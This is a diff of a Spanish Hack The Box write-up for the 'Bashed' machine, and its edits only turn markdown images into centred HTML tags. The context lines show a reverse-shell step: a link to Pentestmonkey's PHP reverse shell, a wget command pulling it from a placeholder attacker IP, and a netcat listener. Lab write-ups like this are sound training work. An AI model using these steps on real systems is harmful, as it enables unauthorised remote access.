@@ -103,7 +103,9 @@ Vamos a entrar.
 
 Bien, es una página algo simple. Veamos que nos dice **Wappalizer**:
 
-![](/assets/images/htb-writeup-bashed/Captura2.png)
+<p align="center">
+<img src="/assets/images/htb-writeup-bashed/Captura2.png">
+</p>
 
 Mmmmm no nos dice mucho, sigamos viendo la página. Hay una publicación de alguien llamado **Development**, ¿será un usuario? Quizá nos sirva más adelante.
 
@@ -229,7 +231,9 @@ www-data
 ## Cargando una Reverse Shell
 Recordemos 2 cosas, una que la página trabaja con PHP y que tiene una carpeta llamada **uploads**.
 
-![](/assets/images/htb-writeup-bashed/Captura7.png)
+<p align="center">
+<img src="/assets/images/htb-writeup-bashed/Captura7.png">
+</p>
 
 Bien, ya conocemos una Reverse Shell de PHP, busquemos a **Pentestmonkey**:
 * https://github.com/pentestmonkey/php-reverse-shell
@@ -270,7 +274,9 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 wget Tu_IP:8000/php-reverse-shell.php
 ```
 
-![](/assets/images/htb-writeup-bashed/Captura8.png)
+<p align="center">
+<img src="/assets/images/htb-writeup-bashed/Captura8.png">
+</p>
 
 * Bien, alzamos una netcat:
 ```
